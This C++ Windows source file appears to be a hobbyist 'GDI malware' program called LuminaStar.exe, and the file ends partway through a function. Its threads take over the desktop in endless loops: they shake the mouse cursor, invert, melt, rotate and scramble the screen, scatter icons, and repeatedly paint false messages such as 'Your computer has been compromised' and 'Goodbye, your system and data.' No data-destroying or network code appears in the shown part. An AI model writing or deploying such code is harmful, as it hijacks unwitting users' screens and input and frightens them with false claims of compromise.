﻿#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <stdlib.h>
#include <time.h>
#include <conio.h>
#include <windef.h>
#include <fstream>
#include <cstdlib>
#include <memory>
#include <iosfwd>
#include <string>
#include <memory>
#include <stdio.h>
#include <tchar.h>
#include <ctime>
#include <cmath>
#include "drawbytebeat.h"
#define PI 3.1415926535897932384626433832795028841971
#define RndRGB (RGB(rand() % 256, rand() % 256, rand() % 256))
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#define DESKTOP_WINDOW ((HWND)0)
using namespace std;
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!(write by pankoza)
	//And I Get It To Pankoza's Oxymorphazone source code.cpp(write by coder-linjian)

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
void InitDPI() {
	HMODULE hModule = LoadLibraryA("user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModule);
}
int refreshscr() {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	InvalidateRect(0, 0, 0);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	return 1;
}
DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
POINT mkp(int x, int y) {
	POINT p;
	p.x = x;
	p.y = y;
	return p;
}
DWORD WINAPI mouseshaking(LPVOID lpParam) {
	POINT cursor;
	while (true) 
	{
		HDC hdc = GetDC(HWND_DESKTOP);
		int icon_x = GetSystemMetrics(SM_CXICON);
		int icon_y = GetSystemMetrics(SM_CYICON);
		GetCursorPos(&cursor);
		int X = cursor.x + rand() % 3 - 1;
		int Y = cursor.y + rand() % 3 - 1;
		SetCursorPos(X, Y);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	return(0);
}
DWORD WINAPI mousedrawluminastaricon(LPVOID lpParam) {
	HDC hdc;
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	HINSTANCE LUMINASTARLOGO = GetModuleHandleA(0);
	POINT point;
	while (true)
	{
		hdc = GetWindowDC(0);
		GetCursorPos(&point);
		DrawIcon(hdc, point.x, point.y, LoadIcon(LUMINASTARLOGO, MAKEINTRESOURCE(107)));
		ReleaseDC(NULL, hdc);
	}
}
DWORD WINAPI rndicon(LPVOID lpParam) {
	HINSTANCE HSHELL32 = LoadLibrary(_T("shell32.dll"));
	HINSTANCE HIMAGERES = LoadLibrary(_T("imageres.dll"));
	HINSTANCE HMORICONS = LoadLibrary(_T("moricons.dll"));
	HINSTANCE HPIFMGR = LoadLibrary(_T("pifmgr.dll"));
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetWindowDC(NULL);
		int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
		int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
		HICON load[9] = { LoadIcon(HSHELL32, MAKEINTRESOURCE(1 + rand() % 336)),LoadIcon(HIMAGERES,MAKEINTRESOURCE(1 + (rand() % 365))),LoadIcon(NULL,MAKEINTRESOURCE(32512 + (rand() % 7))),LoadIcon(HMORICONS,MAKEINTRESOURCE(1 + (rand() % 38))),LoadIcon(HPIFMGR,MAKEINTRESOURCE(1 + (rand() % 113))),LoadCursor(NULL,MAKEINTRESOURCE(101 + rand() % 18)) ,LoadCursor(NULL,MAKEINTRESOURCE(32640 + rand() % 30)) ,LoadCursor(NULL,MAKEINTRESOURCE(32512 * rand() % 5)), LoadCursor(NULL,MAKEINTRESOURCE(32631)) };
		DrawIconEx(hdc, rand() % w, rand() % h, load[rand() % 9], 96 * wdpi / 96, 96 * hdpi / 96, NULL, NULL, DI_NORMAL);
		DrawIconEx(hdc, rand() % w, rand() % h, load[rand() % 9], 96 * wdpi / 96, 96 * hdpi / 96, NULL, NULL, DI_NORMAL);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	return 0;
}
VOID WINAPI circlefunction(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectClipRgn(hdc, hrgn);
	BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
	DeleteObject(hrgn);
	ReleaseDC(NULL, hdc);
}
VOID WINAPI squarefunction(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
	ReleaseDC(NULL, hdc);
}
VOID WINAPI circlefunctioncopy(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectClipRgn(hdc, hrgn);
	SelectObject(hdc, CreateSolidBrush(RndRGB));
	BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
	DeleteObject(hrgn);
	ReleaseDC(NULL, hdc);
}
VOID WINAPI squarefunctioncopy(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectObject(hdc, CreateSolidBrush(RndRGB));
	BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
	ReleaseDC(NULL, hdc);
}
VOID WINAPI transparentcirclefunction(HDC hdc, HDC hcdc, int x, int y, int w, int h)
{
	HRGN hrgn = CreateEllipticRgn(x, y, x + w, y + h);
	SelectClipRgn(hcdc, hrgn);
	HBRUSH hBrush = CreateSolidBrush(RndRGB);
	SelectObject(hcdc, hBrush);
	Rectangle(hcdc, x, y, w + x, h + y);
	DeleteObject(hrgn);
	DeleteObject(hBrush);
}
DWORD WINAPI invertcircle(LPVOID lpParam) {
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;

	while (true)
	{
		const int size = 1000;
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

		for (int i = 0; i < size; i += 100)
		{
			circlefunction(x - i / 2, y - i / 2, i, i);
			Sleep(25);
		}
	}
}
DWORD WINAPI invertsquare(LPVOID lpParam) {
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	HDC hdc = GetDC(0);
	int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;
	while (true)
	{
		const int size = 1000;
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;
		for (int i = 0; i < size; i += 100)
		{
			squarefunction(x - i / 2, y - i / 2, i, i);
			Sleep(25);
		}
	}
}
DWORD WINAPI colourfulcircle(LPVOID lpParam) {
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;

	while (true)
	{
		const int size = 1000;
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

		for (int i = 0; i < size; i += 100)
		{
			circlefunctioncopy(x - i / 2, y - i / 2, i, i);
			Sleep(25);
		}
	}
}
DWORD WINAPI colourfulsquare(LPVOID lpParam) {
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;

	while (true)
	{
		const int size = 1000;
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

		for (int i = 0; i < size; i += 100)
		{
			squarefunctioncopy(x - i / 2, y - i / 2, i, i);
			Sleep(25);
		}
	}
}
DWORD WINAPI transparentcircle(LPVOID lpParam) {
	double angle = 0; int a = 11;
	for (int t = 0;; t++) {
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
		int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
		int b = rand() % a;
		const int size = b * 100 * wdpi / 96;
		int w1 = GetSystemMetrics(SM_CXSCREEN) - (b * 50 * wdpi / 96), h1 = GetSystemMetrics(SM_CYSCREEN) - (b * 50 * hdpi / 96);
		int x = rand() % (w1 + size) - size / 2, y = rand() % (h1 + size) - size / 2;
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BLENDFUNCTION blur = { AC_SRC_OVER, 0, 64, 0 };
		for (int i = 0; i < size; i += (100 * wdpi / 96)) {
			transparentcirclefunction(hdc, hcdc, x - i / 2, y - i / 2, i, i);
			GdiAlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
			Sleep(10);
		}
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
	}
	return 0;
}
DWORD WINAPI balls(LPVOID lpvd) { //credits to N17Pro3426
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int sx = 1;
	int sy = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (true)
	{
		HDC hdc = GetDC(0);
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		x += incrementor * sx;
		y += incrementor * sy;
		HBRUSH hBrush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, hBrush);
		if (x != 0 && y != 0) Pie(hdc, top_x, top_y, bottom_x, bottom_y, rand() % x, rand() % y, rand() % x, rand() % y);
		if (y >= GetSystemMetrics(1)) {
			sy = -1;
		}
		if (x >= GetSystemMetrics(0)) {
			sx = -1;
		}
		if (y == 0) {
			sy = 3;
		}
		if (x == 0) {
			sx = 3;
		}
		Sleep(1);
		DeleteObject(hBrush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI bitchtriangle(LPVOID lpParam)
{
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, 50, 50);
	SelectObject(hcdc, hBitmap);
	for (int i = 0; i <= 50; i++) {
		for (int j = 0; j < 50; j++) {
			SetPixel(hcdc, i, j, RndRGB);
		}
	}
	HBRUSH hBrush = CreatePatternBrush(hBitmap);
	SelectObject(hdc, hBrush);
	int numx = w / 150;
	if (w % 150 != 0) {
		numx++;
	}
	int numy = h / 150;
	if (h % 150 != 0) {
		numy++;
	}
	WAVEFORMATEX fmt = { WAVE_FORMAT_PCM, 1, 44100, 44100, 1, 8, 0 };
	HWAVEOUT hwo;
	const int bufsize = 44100 * 10;
	char* wavedata = (char*)LocalAlloc(0, bufsize);
	WAVEHDR hdr = { wavedata, bufsize, 0, 0, 0, 0, 0, 0 };
	for (int i = 0; i <= 10; i++) {
		for (int i = 0; i < bufsize; i++) {
			wavedata[i] = (unsigned char)((i % 257) / 2 + 100);
		}
		for (int i = 0; i <= numx; i++) {
			for (int j = 0; j <= numy; j++) {
				POINT pt[] = { mkp(150 * i, 150 * j), mkp(150 * i + 150, 150 * j), mkp(150 * i, 150 * j + 150) };
				Polygon(hdc, pt, 3);
			}
		}

	}
	return 0;
}
DWORD WINAPI gradientfilltriangle(LPVOID lpvd)//credits to pankoza
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);


	while (1)
	{
		hdc = GetDC(NULL);
		// Create an array of TRIVERTEX structures that describe
		// positional and color values for each vertex.
		TRIVERTEX vertex[3];
		vertex[0].x = rand() % w;
		vertex[0].y = rand() % h;
		vertex[0].Red = 0xbf00;
		vertex[0].Green = 0xff00;
		vertex[0].Blue = 0x0000;
		vertex[0].Alpha = 0x0000;

		vertex[1].x = rand() % w;
		vertex[1].y = rand() % h;
		vertex[1].Red = 0xf000;
		vertex[1].Green = 0xb000;
		vertex[1].Blue = 0x9000;
		vertex[1].Alpha = 0x0000;

		vertex[2].x = rand() % w;
		vertex[2].y = rand() % h;
		vertex[2].Red = 0xfb00;
		vertex[2].Green = 0xb800;
		vertex[2].Blue = 0x0000;
		vertex[2].Alpha = 0x0000;

		// Create a GRADIENT_TRIANGLE structure that
		// references the TRIVERTEX vertices.
		GRADIENT_TRIANGLE gTriangle;
		gTriangle.Vertex1 = 0;
		gTriangle.Vertex2 = 1;
		gTriangle.Vertex3 = 2;

		// Draw a shaded triangle.
		GradientFill(hdc, vertex, 3, &gTriangle, 1, GRADIENT_FILL_TRIANGLE);
		ReleaseDC(0, hdc);
		Sleep(50);
	}

	return 0x00;
}
DWORD WINAPI textoutz(LPVOID lpvd)
{
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	LPCSTR text = 0;
	LPCSTR text1 = 0;
	LPCSTR text2 = 0;
	LPCSTR text3 = 0;
	LPCSTR text4 = 0;
	LPCSTR text5 = 0;
	LPCSTR text6 = 0;
	while (true)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		text = "LuminaStar.exe";
		text1 = "LanPiaoPiaoFlyNB";
		text2 = "LambdaTechnology Studio";
		text3 = "Your computer has been compromised by me, can't recovered.";
		text4 = "Want Meteofruit(SuperStar) reward?";
		text5 = "Goodbye, your system and data.";
		text6 = "It's very scary, isn't it?";
		SetTextColor(hdc, RndRGB);
		HFONT font = CreateFontA(rand() % 100, rand() % 100, 0, 0, FW_EXTRABOLD, 0, rand() % 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Ink Free");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text4, strlen(text4));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text5, strlen(text5));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text6, strlen(text6));
		Sleep(10);
		DeleteObject(font);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI me1tin9(LPVOID lpParam)
{
	while (1)
	{
		HDC hdc = GetDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
		HDC hdcTemp = CreateCompatibleDC(hdc);
		HBITMAP hbmOld = (HBITMAP)SelectObject(hdcTemp, hbm);
		BitBlt(hdcTemp, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int numShifts = 600;
		for (int i = 0; i < numShifts; i++)
		{
			int x = rand() % w;
			int y = rand() % h;
			int dx = (rand() % 5) - 1;
			int dy = (rand() % 5) - 1;
			BitBlt(hdcTemp, x + dx, y + dy, w - x, h - y, hdcTemp, x, y, SRCCOPY);
		}
		BitBlt(hdc, 0, 0, w, h, hdcTemp, 0, 0, SRCINVERT);
		SelectObject(hdcTemp, hbmOld);
		DeleteDC(hdcTemp);
		DeleteObject(hbm);
		ReleaseDC(NULL, hdc);
	}
}
DWORD WINAPI crazyrgb(LPVOID lpParam)
{
	HDC hdc = 0;
	int sx = 0, sy = 0;
	int rx = 0, ry = 0;

	while (1)
	{
		hdc = GetWindowDC(GetDesktopWindow());
		sx = GetSystemMetrics(SM_CXSCREEN);
		sy = GetSystemMetrics(SM_CYSCREEN);
		rx = rand() % sx;
		ry = rand() % sy;
		SelectObject(hdc, CreateSolidBrush(RndRGB));
		PatBlt(hdc, 0, 0, sx, sy, PATINVERT);
		Sleep(10);
	}
}
DWORD WINAPI strangetunnel(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), counter = PI * PI * PI, xSize = sh, ySize = sw / 45;
	RECT rekt; POINT pt[3];
	while (1) {
		for (int i = 0; i < sh / 3; i++) {
			HDC desk = GetDC(0);
			GetWindowRect(GetDesktopWindow(), &rekt);
			pt[0].x = rekt.left + counter;
			pt[0].y = rekt.top - sin(i / ((float)xSize) * PI) * (ySize);
			pt[1].x = rekt.right + counter;
			pt[1].y = rekt.top + counter;
			pt[2].x = rekt.left - counter;
			pt[2].y = rekt.bottom - counter;
			PlgBlt(desk, pt, desk, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
			Sleep(5.9);
		}
	}
}
DWORD WINAPI bitchscreenrotate(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 3;
		wPt[0].y = wRect.top - 6;
		wPt[1].x = wRect.right + 4;
		wPt[1].y = wRect.top + 5;
		wPt[2].x = wRect.left - 6;
		wPt[2].y = wRect.bottom + 9;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right + wRect.left, wRect.bottom + wRect.top, 0, 0, 0);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI funnystretchblt(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(NULL);
		int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
		int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HBRUSH brush1 = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
		HBRUSH brush2 = CreateSolidBrush(RGB(255 - (rand() % 256), 255 - (rand() % 256), 255 - (rand() % 256)));
		HBRUSH brush3 = CreateSolidBrush(RGB(2 * (rand() % 128), 2 * (rand() % 128), 2 * (rand() % 128)));
		HBRUSH brush4 = CreateSolidBrush(RGB(rand() % 256, 255 - (rand() % 256), 2 * (rand() % 128)));
		SelectObject(hdc, brush1);
		StretchBlt(hdc, 0, 0, w / 4, h / 4, hdc, 0, 0, w, h, SRCPAINT);
		StretchBlt(hdc, 0, 0, w / 4, h / 4, hdc, 0, 0, w, h, PATINVERT);
		StretchBlt(hdc, w / 4, 0, w / 4, h / 4, hdc, 0, 0, w, h, SRCPAINT);
		StretchBlt(hdc, w / 4, 0, w / 4, h / 4, hdc, 0, 0, w, h, PATINVERT);
		StretchBlt(hdc, 0, h / 4, w / 4, h / 4, hdc, 0, 0, w, h, SRCPAINT);
		StretchBlt(hdc, 0, h / 4, w / 4, h / 4, hdc, 0, 0, w, h, PATINVERT);
		DeleteObject(brush1);
		SelectObject(hdc, brush2);
		StretchBlt(hdc, w / 2, 0, w / 4, h / 4, hdc, 0, 0, w, h, SRCPAINT);
		StretchBlt(hdc, w / 2, 0, w / 4, h / 4, hdc, 0, 0, w, h, PATINVERT);
		StretchBlt(hdc, w / 4 * 3, 0, w / 4, h / 4, hdc, 0, 0, w, h, SRCPAINT);
		StretchBlt(hdc, w / 4 * 3, 0, w / 4, h / 4, hdc, 0, 0, w, h, PATINVERT);
		StretchBlt(hdc, w / 4 * 3, h / 4, w / 4, h / 4, hdc, 0, 0, w, h, SRCPAINT);
		StretchBlt(hdc, w / 4 * 3, h / 4, w / 4, h / 4, hdc, 0, 0, w, h, PATINVERT);
		DeleteObject(brush2);
		SelectObject(hdc, brush3);
		StretchBlt(hdc, 0, h / 2, w / 4, h / 4, hdc, 0, 0, w, h, SRCPAINT);
		StretchBlt(hdc, 0, h / 2, w / 4, h / 4, hdc, 0, 0, w, h, PATINVERT);
		StretchBlt(hdc, 0, h / 4 * 3, w / 4, h / 4, hdc, 0, 0, w, h, SRCPAINT);
		StretchBlt(hdc, 0, h / 4 * 3, w / 4, h / 4, hdc, 0, 0, w, h, PATINVERT);
		StretchBlt(hdc, w / 4, h / 4 * 3, w / 4, h / 4, hdc, 0, 0, w, h, SRCPAINT);
		StretchBlt(hdc, w / 4, h / 4 * 3, w / 4, h / 4, hdc, 0, 0, w, h, PATINVERT);
		DeleteObject(brush3);
		SelectObject(hdc, brush4);
		StretchBlt(hdc, w / 4 * 3, h / 2, w / 4, h / 4, hdc, 0, 0, w, h, SRCPAINT);
		StretchBlt(hdc, w / 4 * 3, h / 2, w / 4, h / 4, hdc, 0, 0, w, h, PATINVERT);
		StretchBlt(hdc, w / 2, h / 4 * 3, w / 4, h / 4, hdc, 0, 0, w, h, SRCPAINT);
		StretchBlt(hdc, w / 2, h / 4 * 3, w / 4, h / 4, hdc, 0, 0, w, h, PATINVERT);
		StretchBlt(hdc, w / 4 * 3, h / 4 * 3, w / 4, h / 4, hdc, 0, 0, w, h, SRCPAINT);
		StretchBlt(hdc, w / 4 * 3, h / 4 * 3, w / 4, h / 4, hdc, 0, 0, w, h, PATINVERT);
		DeleteObject(brush4);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}
DWORD WINAPI mosaic(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int x = 0; x <= w; x += 10) {
			for (int y = 0; y <= h; y += 10) {
				StretchBlt(hcdc, x, y, 10, 10, hcdc, x, y, 1, 1, SRCCOPY);
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(hdc);
		DeleteObject(hcdc);
		DeleteObject(hBitmap);
		Sleep(100);
	}
}
DWORD WINAPI notsrccopyscreen(LPVOID lpParam) {
	while (true)
	{
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetWindowDC(0);
		int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
		int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
		int a = 1 + rand() % 64, b = 1 + rand() % 64;
		for (int y = 0; y <= h; y += 16 * wdpi / 96) {
			StretchBlt(hdc, -a * tan((float)b * y), y, w, 10, hdc, 0, y, w, 10, NOTSRCCOPY);
			Sleep(1);
		}
		ReleaseDC(NULL, hdc);
	}
}
DWORD WINAPI sharpen(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int sw = GetSystemMetrics(0);
		int sh = GetSystemMetrics(1);
		SetStretchBltMode(hdc, HALFTONE);
		StretchBlt(hdc, -20, 0, sw, sh + 20, hdc, 0, 0, sw, sh, SRCCOPY);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI grayscreenmove(LPVOID lpParam) {//credits to pankoza
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int randPixel = Xorshift32() % w;
			int tempB = GetBValue(data[i].rgb);
			data[i].rgb = RGB(GetBValue(data[randPixel].rgb), GetBValue(data[randPixel].rgb), GetBValue(data[randPixel].rgb));
			data[randPixel].rgb = RGB(tempB, tempB, tempB);
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI shader1(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	while (true)
	{
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += y * (i & x) % (x + 1);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader2(LPVOID lpvd) //credits to pankoza, but i modified it
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (true)
	{
		hdc = GetDC(NULL);
